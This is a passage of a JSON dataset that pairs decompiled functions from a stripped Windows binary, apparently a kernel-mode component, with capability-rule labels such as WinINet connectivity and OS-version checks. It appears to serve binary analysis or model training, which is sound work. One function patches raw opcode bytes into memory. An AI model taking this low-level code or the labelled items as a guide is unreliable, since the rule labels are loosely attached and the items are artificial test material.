        "decompiled_code": "\nuint64_t fcn.0001aac0(ulong noname_0, uint64_t *arg2, uint8_t *arg3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    int64_t in_GS_OFFSET;\n    bool bVar10;\n    \n    uVar9 = 0;\n    uVar1 = (*_fcn.000115f8)();\n    *arg3 = uVar1;\n    if (uVar1 < noname_0) {\n        uVar1 = (**0x11228)();\n        *arg3 = uVar1;\n    }\n    iVar2 = fcn.0004cb4c();\n    uVar4 = uVar9;\n    if (iVar2 != 1) {\n        LOCK();\n        *0x7e260 = 0;\n        LOCK();\n        *0x7e268 = 0;\n        uVar3 = fcn.0004cb4c();\n        uVar4 = fcn.00030cc4(uVar3 << 6);\n        if (uVar4 == 0) {\n            uVar9 = 0xc0000017;\n        }\n        else {\n            uVar1 = *(in_GS_OFFSET + 0x52);\n            iVar2 = fcn.0004cb4c();\n            uVar5 = uVar9;\n            if (iVar2 != 0) {\n                do {\n                    if (uVar5 != uVar1) {\n                        iVar7 = uVar5 * 0x40 + uVar4;\n                        (**0x11610)(iVar7, 0x1aa98, 0);\n                        uVar6 = 0;\n                        (**0x11618)(iVar7, 2);\n                        (**0x11620)(iVar7, uVar6 & 0xffffffffffffff00 | uVar5 & 0xff);\n                        (**0x11628)(iVar7, 0);\n                    }\n                    uVar8 = uVar5 + 1;\n                    uVar5 = uVar8;\n                    uVar3 = fcn.0004cb4c();\n                } while (uVar8 < uVar3);\n            }\n            iVar2 = fcn.0004cb4c();\n            uVar5 = iVar2 - 1;\n            do {\n                LOCK();\n                bVar10 = uVar5 == *0x7e268;\n                *0x7e268 = *0x7e268 ^ bVar10 * (*0x7e268 ^ uVar5);\n            } while (!bVar10);\n        }\n    }\n    *arg2 = uVar4;\n    return uVar9;\n}\n",
        "token_count": 623
    },
    "0001b1c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0001b1c4(void)\n\n{\n    uint64_t arg1;\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    int64_t arg1_00;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    int64_t noname_0;\n    uint64_t uStackX8;\n    ulong uStackX16;\n    ulong auStackX24 [2];\n    uchar auStack696 [32];\n    int64_t iStack664;\n    int32_t iStack504;\n    uint32_t uStack456;\n    \n    if (*0x7e270 == 0) {\n        uVar1 = (*_fcn.000115f8)();\n        if (uVar1 < 2) {\n            fcn.00053f78(auStack696);\n            fcn.00052628(auStack696);\n            fcn.00052648(auStack696, 0);\n            uVar6 = fcn.0004e130(*(*0x69080 + 0x10), 0x11b18, &uStackX8);\n            arg1 = uStackX8;\n            if (uVar6 == 0) {\n                iVar5 = -(uStackX8 & 0xfff);\n                uVar8 = iVar5 + 0x1000;\n                uVar6 = fcn.0001ac10(uStackX8, uVar8, 0, &uStackX16);\n                if (uVar6 == 0) {\n                    noname_0 = (arg1 & 0xfffffffffffff000) + 0x1000;\n                    iVar2 = fcn.0001ac10(noname_0, 0x1000, 0, auStackX24);\n                    if (iVar2 == 0) {\n                        uVar8 = iVar5 + 0x2000;\n                    }\n                    arg1_00 = fcn.00030cc4(0x60);\n                    uVar9 = uStackX8;\n                    if (arg1_00 == 0) {\n                        uVar6 = 0xc000009a;\n                    }\n                    else {\n                        fcn.00052458(auStack696, uStackX8);\n                        while (iVar5 = fcn.00053fb0(auStack696),  iVar5 != 0) {\n                            if (iStack504 == 0x1be) {\n                                uVar6 = 0;\n                                puVar10 = uVar9 + (arg1_00 - uStackX8);\n                                *0x7e270 = arg1_00;\n                                *puVar10 = 0xc6;\n                                puVar10[1] = 0x80;\n                                *(puVar10 + 2) = uVar8;\n                                puVar10[6] = 0;\n                                puVar10[7] = 0xc3;\n                                fcn.0006670a(arg1_00 + 0x30, arg1_00, 0x30);\n                                puVar10[0x36] = 1;\n                                *0x7e278 = arg1_00 + 0x30;\n                                goto code_r0x0001b359;\n                            }\n                            uVar3 = fcn.00052660(auStack696);\n                            uVar6 = fcn.00052658(auStack696);\n                            iVar7 = fcn.00052650(auStack696);\n                            fcn.0006670a(arg1_00 + iVar7, uVar6, uVar3);\n                            uVar8 = uStack456;\n                            uVar4 = fcn.00052660(auStack696);\n                            uVar9 = iStack664 - uVar4;\n                        }\n                        uVar6 = 0xc0000001;\n                        fcn.00030d24(arg1_00);\n                    }\ncode_r0x0001b359:\n                    fcn.0001ac80(arg1, uStackX16);\n                    if (iVar2 == 0) {\n                        fcn.0001ac80(noname_0, auStackX24[0]);\n                    }\n                }\n            }\n        }\n        else {\n            uVar6 = 0xc0000001;\n        }\n    }\n    else {\n        uVar6 = 0;\n    }\n    return uVar6;\n}\n",
        "token_count": 982
    },
    "0001ca30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001ca30(void)\n\n{\n    if (*0x7e548 != 0) {\n        fcn.00016dac();\n        fcn.000667e8(0x1c8c0, 1);\n        fcn.0001e11c();\n        fcn.00063714();\n        (*_fcn.000115b8)(*0x7e540);\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0001cae8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001cae8(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    ulong in_stack_00000038;\n    \n    if (*0x7e568 == 0) {\n        uVar3 = fcn.000667f4();\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        pcVar4 = fcn.000547bc(*0x7e568);\n        uVar2 = (*pcVar4)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038);\n        uVar3 = uVar2;\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 239
    },
    "0001cb94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001cb94(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    \n    if (*0x7e570 == 0) {\n        uVar3 = fcn.000666f8();\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        pcVar4 = fcn.000547bc(*0x7e570);\n        uVar2 = (*pcVar4)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n        uVar3 = uVar2;\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 223
    },
    "0001cc28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001cc28(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    \n    if (*0x7e578 == 0) {\n        uVar3 = fcn.000667b2();\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        pcVar4 = fcn.000547bc(*0x7e578);\n        uVar2 = (*pcVar4)(arg1, arg2, arg3, arg4);\n        uVar3 = uVar2;\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 191
    },
    "0001cc8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001cc8c(uint64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    \n    if (*0x7e580 == 0) {\n        uVar3 = fcn.000667fa();\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        pcVar4 = fcn.000547bc(*0x7e580);\n        uVar2 = (*pcVar4)(arg1, arg2);\n        uVar3 = uVar2;\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 177
    },
    "000649a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000649a4(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    arg1_00 = *arg1;\n    fcn.00030310(0x8e2e8);\n    iVar2 = fcn.0005cf30(arg1_00, 3);\n    if ((iVar2 == 0) || (piVar1 = *arg1_00,  *(piVar1 + 1) != 0)) {\n        fcn.00030378(0x8e2e8);\n    }\n    else {\n        *(piVar1 + 0xc) = arg2;\n        *(piVar1 + 1) = 1;\n        fcn.00030378(0x8e2e8);\n        (**(**arg1_00 + 0x24))(arg1_00, arg2);\n        fcn.00064668(arg1_00);\n    }\n    *arg1 = NULL;\n    return;\n}\n",
        "token_count": 238
    },
    "0001d99c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001d99c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint32_t auStackX8 [8];\n    char *apcStack72 [5];\n    \n    apcStack72[0] = 0x11d58;\n    apcStack72[1] = 0x11d50;\n    apcStack72[2] = 0x11d40;\n    apcStack72[3] = 0x11d38;\n    *0x7e828 = fcn.0002748c(6, 2);\n    uVar6 = 0;\n    if (*0x7e818 != 0) {\n        iVar9 = 0;\n        do {\n            fcn.00030d24(*(iVar9 + *0x7e820));\n            uVar6 = uVar6 + 1;\n            iVar9 = iVar9 + 8;\n        } while (uVar6 < *0x7e818);\n    }\n    fcn.00030d24(*0x7e820);\n    *0x7e820 = fcn.00030c98(0x20);\n    if (*0x7e820 == 0) {\n        return;\n    }\n    uVar6 = 0;\n    iVar9 = 0;\n    do {\n        pcVar8 = *(apcStack72 + iVar9);\n        uVar4 = 0xffffffffffffffff;\n        pcVar5 = pcVar8;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = fcn.00030c98(~uVar4);\n        *(iVar9 + *0x7e820) = uVar3;\n        if (*(iVar9 + *0x7e820) == 0) {\n            *0x7e818 = uVar6;\n            return;\n        }\n        pcVar5 = *(iVar9 + *0x7e820);\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            *pcVar5 = cVar1;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar6 = uVar6 + 1;\n        iVar9 = iVar9 + 8;\n    } while (uVar6 < 4);\n    *0x7e818 = uVar6;\n    iVar2 = fcn.00027418(7, 0, 0, auStackX8);\n    if (iVar2 != 0) {\n        return;\n    }\n    if (auStackX8[0] == 0) {\n        return;\n    }\n    pcVar8 = fcn.00030c98(auStackX8[0]);\n    if (pcVar8 == NULL) {\n        return;\n    }\n    iVar2 = fcn.00027418(7, pcVar8, auStackX8[0], auStackX8);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n        cVar1 = *pcVar8;\n        pcVar7 = pcVar8;\n        pcVar5 = pcVar8;\n        while (cVar1 != '\\0') {\n            if ((cVar1 == ';') && (1 < pcVar7 - pcVar5)) {\n                pcVar5 = pcVar7 + 1;\n                iVar2 = iVar2 + 1;\n            }\n            pcVar7 = pcVar7 + 1;\n            cVar1 = *pcVar7;\n        }\n        uVar4 = iVar2 + 2 << 3;\n        if (iVar2 + 2 == 0) {\n            fcn.00030d24(*0x7e820);\n            *0x7e820 = 0;\n        }\n        else {\n            iVar9 = fcn.00030c98(uVar4);\n            if (iVar9 == 0) goto code_r0x0001daef;\n            uVar10 = 0x10;\n            if (uVar4 < 0x10) {\n                uVar10 = uVar4;\n            }\n            fcn.0006670a(iVar9, *0x7e820, uVar10);\n            fcn.00030d24(*0x7e820);\n            *0x7e820 = iVar9;\n        }\n        cVar1 = *pcVar8;\n        pcVar7 = pcVar8;\n        pcVar5 = pcVar8;\n        while (cVar1 != '\\0') {\n            if ((*pcVar7 == ';') && (1 < pcVar7 - pcVar5)) {\n                *pcVar7 = '\\0';\n                auStackX8[0] = (pcVar7 - pcVar5) + 1;\n                uVar3 = fcn.00030c98(auStackX8[0]);\n                *(*0x7e820 + *0x7e818 * 8) = uVar3;\n                if (*(*0x7e820 + *0x7e818 * 8) != 0) {\n                    fcn.0006670a(*(*0x7e820 + *0x7e818 * 8), pcVar5, auStackX8[0]);\n                    fcn.0006680c();\n                    *0x7e818 = *0x7e818 + 1;\n                }\n                pcVar5 = pcVar7 + 1;\n            }\n            pcVar7 = pcVar7 + 1;\n            cVar1 = *pcVar7;\n        }\n    }\ncode_r0x0001daef:\n    fcn.00030d24(pcVar8);\n    return;\n}\n",
        "token_count": 1349
    },
    "0001e20c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001e20c(void)\n\n{\n    if (*0x7eab6 != '\\0') {\n        *0x7eab6 = '\\0';\n        fcn.00059140(*0x7eaf8);\n        fcn.0005540c(0x7eaf8);\n        fcn.00059140(*0x7eae8);\n        fcn.0005540c(0x7eae8);\n        fcn.00059140(*0x7eaf0);\n        fcn.0005540c(0x7eaf0);\n        fcn.00019460();\n        fcn.00018a58();\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0001e660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001e660(ulong arg1, ulong arg2)\n\n{\n    char16_t cVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int64_t iVar12;\n    char16_t *pcVar13;\n    int16_t *piVar14;\n    uchar auStackX24 [16];\n    uchar auStack312 [272];\n    \n    iVar4 = 0;\n    if (*0x7eb80 == 0) {\n        fcn.00029134(L\"Ultra3\", 0x52);\n        uVar9 = 0xffffffffffffffff;\n        uVar8 = uVar9;\n        pcVar13 = L\"Ultra3\";\n        do {\n            if (uVar8 == 0) break;\n            uVar8 = uVar8 - 1;\n            cVar1 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar1 != L'\\0');\n        *0x7eb80 = ~uVar8 - 1;\n        fcn.0002918c(0x7e900, 0x52);\n        piVar14 = 0x7e900;\n        do {\n            if (uVar9 == 0) break;\n            uVar9 = uVar9 - 1;\n            iVar2 = *piVar14;\n            piVar14 = piVar14 + 1;\n        } while (iVar2 != 0);\n        *0x7e8c0 = ~uVar9 - 1;\n    }\n    iVar3 = fcn.00031328(arg1, L\"Ultra3\", *0x7eb80);\n    if ((iVar3 == 0) || (iVar3 = fcn.00031328(arg1, 0x7e900, *0x7e8c0),  iVar3 == 0)) {\n        uVar5 = 1;\n        iVar4 = *0x7e828;\n    }\n    else {\n        uVar5 = 0;\n        fcn.00032650(0x7e7f0, auStackX24, 0);\n        uVar10 = *0x7e808;\n        uVar9 = 0;\n        piVar6 = *0x7e810;\n        if (*0x7e808 != 0) {\n            do {\n                if (*piVar6 == arg2) {\n                    iVar4 = (*0x7e810)[uVar9 * 2 + 1];\n                    break;\n                }\n                uVar11 = uVar9 + 1;\n                uVar9 = uVar11;\n                piVar6 = piVar6 + 2;\n            } while (uVar11 < *0x7e808);\n        }\n        fcn.00032684(0x7e7f0, auStackX24, 0);\n        if (uVar10 <= uVar9) {\n            return 0;\n        }\n    }\n    if (iVar4 == 1) {\ncode_r0x0001e7ee:\n        uVar5 = 1;\n    }\n    else if (iVar4 == 0) {\n        uVar5 = 0;\n    }\n    else if (iVar4 == 2) {\n        uVar5 = 0;\n        iVar4 = fcn.0003205c(auStack312, 0x104);\n        if (iVar4 == 0) {\n            uVar5 = 1;\n        }\n        else {\n            fcn.0006680c(auStack312);\n            uVar10 = 0;\n            if (*0x7e818 != 0) {\n                iVar12 = 0;\n                do {\n                    iVar7 = fcn.00066818(auStack312, *(iVar12 + *0x7e820));\n                    if (iVar7 != 0) goto code_r0x0001e7ee;\n                    uVar10 = uVar10 + 1;\n                    iVar12 = iVar12 + 8;\n                } while (uVar10 < *0x7e818);\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 960
    },
    "0001e974": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001e974(ulong arg1)\n\n{\n    char in_DL;\n    int64_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar auStackX24 [16];\n    \n    fcn.00032650(0x7eb50, auStackX24, 1);\n    uVar3 = 0;\n    if (*0x7eb68 != 0) {\n        iVar2 = 0;\n        iVar1 = *0x7eb70;\n        uVar5 = *0x7eb68;\n        do {\n            if (*(iVar2 + iVar1) == arg1) {\n                if ((in_DL != '\\0') && (*(iVar2 + 4 + iVar1) == '\\0')) break;\n                iVar4 = iVar2;\n                uVar6 = uVar3;\n                if (uVar3 < uVar5 - 1) {\n                    do {\n                        uVar6 = uVar6 + 1;\n                        *(iVar4 + iVar1) = *(iVar4 + 8 + iVar1);\n                        iVar4 = iVar4 + 8;\n                        iVar1 = *0x7eb70;\n                        uVar5 = *0x7eb68;\n                    } while (uVar6 < *0x7eb68 - 1);\n                }\n                *0x7eb68 = uVar5 - 1;\n                fcn.00031630(0x7eb70, uVar5 << 3, *0x7eb68 << 3);\n                iVar1 = *0x7eb70;\n                uVar5 = *0x7eb68;\n            }\n            uVar3 = uVar3 + 1;\n            iVar2 = iVar2 + 8;\n        } while (uVar3 < uVar5);\n    }\n    fcn.00032684(0x7eb50, auStackX24, 1);\n    return;\n}\n",
        "token_count": 442
    },
    "0001ea78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0001ea78(ulong arg1, ulong *arg2, ulong arg3, ulong arg4)\n\n{\n    bool bVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    ulong in_stack_00000028;\n    ulong *puStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    \n    bVar2 = false;\n    bVar1 = false;\n    uStack64 = 0;\n    uStack72 = 0;\n    uStack80 = 0;\n    if (*0x7eb18 == NULL) {\n        return 0x21590001;\n    }\n    uStack88 = in_stack_00000028;\n    puStack104 = arg2;\n    uStack96 = arg3;\n    cVar3 = (**0x11250)();\n    if (cVar3 == '\\x01') {\n        uVar5 = CONCAT71(arg3 >> 8, 1);\n        iVar4 = fcn.0001acb4(&puStack104, 8, uVar5, 2);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        bVar2 = true;\n        uVar5 = uVar5 & 0xffffffffffffff00 | 1;\n        iVar4 = fcn.0001acb4(&uStack88, 8, uVar5, 2);\n        if (iVar4 != 0) goto code_r0x0001ebcc;\n        bVar1 = true;\n        iVar4 = fcn.0001acb4(&uStack96, 4, uVar5 & 0xffffffffffffff00 | 1, 2);\n        if (iVar4 == 0) goto code_r0x0001eb6d;\ncode_r0x0001ebb8:\n        fcn.0001ad2c(uStack88, uStack72);\n    }\n    else {\ncode_r0x0001eb6d:\n        iVar4 = (**0x7eb18)(arg1, puStack104, uStack96, arg4, uStack88);\n        if (iVar4 == 0) {\n            *arg2 = *puStack104;\n        }\n        if (bVar1) {\n            fcn.0001ad2c(uStack96, uStack80);\n            goto code_r0x0001ebb8;\n        }\n    }\n    if (!bVar2) {\n        return iVar4;\n    }\ncode_r0x0001ebcc:\n    fcn.0001ad2c(puStack104, uStack64);\n    return iVar4;\n}\n",
        "token_count": 593
    },
    "0001ebec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001ebec(uint64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    \n    if (*0x7eb20 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b3e0(0);\n        uVar2 = (**0x7eb20)(arg1, arg2);\n        fcn.0001b3e0(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "0001ec38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0001ec38(ulong *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    uint *in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    uchar in_stack_00000040;\n    uint *puStack152;\n    ulong *puStack144;\n    ulong uStack136;\n    ulong uStack128;\n    int64_t iStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    \n    uStack80 = 0;\n    uStack96 = 0;\n    uStack104 = 0;\n    uStack112 = 0;\n    uStack88 = 0;\n    bVar8 = false;\n    bVar7 = false;\n    bVar5 = false;\n    bVar4 = false;\n    if (*0x7eb30 == NULL) {\n        return 0x21590001;\n    }\n    uStack136 = in_stack_00000030;\n    puStack152 = in_stack_00000028;\n    uStack128 = in_stack_00000038;\n    iVar12 = arg3;\n    puStack144 = arg1;\n    iStack120 = arg3;\n    cVar10 = (**0x11250)();\n    bVar9 = false;\n    if (cVar10 != '\\x01') goto code_r0x0001edc3;\n    uVar13 = CONCAT71(iVar12 >> 8, 1);\n    iVar11 = fcn.0001acb4(&puStack144, 8, uVar13, 2);\n    if (iVar11 != 0) {\n        return iVar11;\n    }\n    bVar8 = true;\n    bVar9 = true;\n    if (in_stack_00000028 != NULL) {\n        uVar13 = uVar13 & 0xffffffffffffff00 | 1;\n        iVar11 = fcn.0001acb4(&puStack152, 0x10, uVar13, 2);\n        if (iVar11 != 0) goto code_r0x0001ee8e;\n        bVar7 = true;\n    }\n    uVar13 = CONCAT71(uVar13 >> 8, 1);\n    iVar11 = fcn.0001acb4(&uStack136, 0x2a0, uVar13, 0);\n    if (iVar11 == 0) {\n        bVar6 = true;\n        uVar13 = uVar13 & 0xffffffffffffff00 | 1;\n        iVar11 = fcn.0001acb4(&uStack128, 0x28, uVar13, 0);\n        bVar9 = bVar8;\n        if (iVar11 == 0) {\n            bVar5 = true;\n            bVar9 = true;\n            if (arg3 == 0) {\ncode_r0x0001edc3:\n                bVar6 = bVar9;\n                iVar11 = (**0x7eb30)(puStack144, arg2, iStack120, arg4, puStack152, uStack136, uStack128, \n                                     in_stack_00000040);\n                if ((iVar11 == 0) && (*arg1 = *puStack144,  in_stack_00000028 != NULL)) {\n                    uVar1 = puStack152[1];\n                    uVar2 = puStack152[2];\n                    uVar3 = puStack152[3];\n                    *in_stack_00000028 = *puStack152;\n                    in_stack_00000028[1] = uVar1;\n                    in_stack_00000028[2] = uVar2;\n                    in_stack_00000028[3] = uVar3;\n                }\n                if (bVar4) {\n                    fcn.0001ad2c(iStack120, uStack88);\n                }\n                bVar9 = bVar8;\n                if (bVar5) goto code_r0x0001ee52;\n            }\n            else {\n                iVar11 = fcn.0001acb4(&iStack120, 0x30, uVar13 & 0xffffffffffffff00 | 1, 2);\n                if (iVar11 == 0) {\n                    bVar4 = true;\n                    goto code_r0x0001edc3;\n                }\ncode_r0x0001ee52:\n                fcn.0001ad2c(uStack128, uStack112);\n                bVar9 = bVar8;\n            }\n            if (!bVar6) goto code_r0x0001ee75;\n        }\n        fcn.0001ad2c(uStack136, uStack104);\n    }\ncode_r0x0001ee75:\n    if (bVar7) {\n        fcn.0001ad2c(puStack152, uStack96);\n    }\n    if (!bVar9) {\n        return iVar11;\n    }\ncode_r0x0001ee8e:\n    fcn.0001ad2c(puStack144, uStack80);\n    return iVar11;\n}\n",
        "token_count": 1197
    },
    "0001eeb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0001eeb8(ulong *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    char cVar8;\n    int32_t iVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    uint in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    int64_t in_stack_00000058;\n    int64_t iStack160;\n    ulong *puStack152;\n    int64_t iStack144;\n    ulong uStack136;\n    ulong uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    \n    uStack88 = 0;\n    uStack104 = 0;\n    uStack112 = 0;\n    uStack120 = 0;\n    uStack96 = 0;\n    bVar7 = false;\n    bVar5 = false;\n    bVar3 = false;\n    bVar1 = false;\n    bVar2 = false;\n    if (*0x7eb38 == NULL) {\n        return 0x21590001;\n    }\n    uStack136 = *(in_stack_00000058 + 0x18);\n    iStack160 = in_stack_00000058;\n    uStack128 = *(in_stack_00000058 + 0x38);\n    iVar10 = arg3;\n    puStack152 = arg1;\n    iStack144 = arg3;\n    cVar8 = (**0x11250)();\n    if (cVar8 != '\\x01') goto code_r0x0001f087;\n    uVar11 = CONCAT71(iVar10 >> 8, 1);\n    iVar9 = fcn.0001acb4(&puStack152, 8, uVar11, 2);\n    if (iVar9 != 0) {\n        return iVar9;\n    }\n    bVar6 = true;\n    bVar7 = true;\n    if (arg3 != 0) {\n        uVar11 = uVar11 & 0xffffffffffffff00 | 1;\n        